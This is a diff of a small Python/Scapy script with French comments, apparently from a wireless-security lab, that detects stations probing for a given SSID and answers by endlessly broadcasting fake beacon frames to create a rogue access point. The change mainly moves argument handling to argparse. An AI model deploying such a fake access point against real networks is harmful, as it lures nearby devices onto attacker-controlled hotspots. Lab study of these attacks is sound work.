@@ -15,7 +15,7 @@
 #
 #-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==-==
 
-import sys
+import argparse
 from scapy.all import *
 
 interface = "wlan0mon"
@@ -23,10 +23,16 @@ interface = "wlan0mon"
 # Nom du point d'accès passé en paramètre au script
 ap_SSID = set()
 
+# Arguments
+parser = argparse.ArgumentParser(description="script capable de détecter une STA recherchant un SSID particulier")
+parser.add_argument("--ssid", required=True, type=str, help="le SSID donné")
+
+arguments = parser.parse_args()
+
 # fonction appelée pour chaque paquet sniffé
 def packetHandler(pkt):
     # Test si c'est bien un packet ProbeRequest
-    if pkt.haslayer(Dot11ProbeReq):
+    if Dot11ProbeReq in pkt :
         # Test si le SSID correspond à celui qui a été fourni
         if len(pkt.info) > 0  and pkt.info.decode() == ap_SSID:
             # Création du faux point d'accès
@@ -35,16 +41,18 @@ def packetHandler(pkt):
  
 # Fonction permettant la création d'un faux point d'accès
 def fakeApCreator():
-    # adresse mac aléatoire
+    # Création d'une adresse mac aléatoire pour le point d'accès
     mac_AP = str(RandMAC())
-    fake_AP_packet = RadioTap() / Dot11(type=0, subtype=8, addr1="FF:FF:FF:FF:FF:FF",addr2=mac_AP, addr3=mac_AP) / Dot11Beacon() / Dot11Elt(ID= "SSID", info=ap_SSID)
 
+    # Création du paquet à envoyer
+    fake_AP_packet = RadioTap()/Dot11(type=0,subtype=8,addr1="FF:FF:FF:FF:FF:FF",addr2=mac_AP,addr3=mac_AP)/Dot11Beacon()/Dot11Elt(ID="SSID",info=ap_SSID)
+
+    # Envoi en continu des beacon
     while True:
         sendp(fake_AP_packet, iface=interface)
 
-if (len(sys.argv) != 2):
-
-    ap_SSID = sys.argv[1]
-    # On sniffe en passant en fonction de callback la fonction sniffing
-    a = sniff(iface=interface, prn=packetHandler)
+# Récupération du SSID donné
+ap_SSID = arguments.ssid
+# On sniffe en passant en fonction de callback la fonction packetHandler
+a = sniff(iface=interface, prn=packetHandler)
 
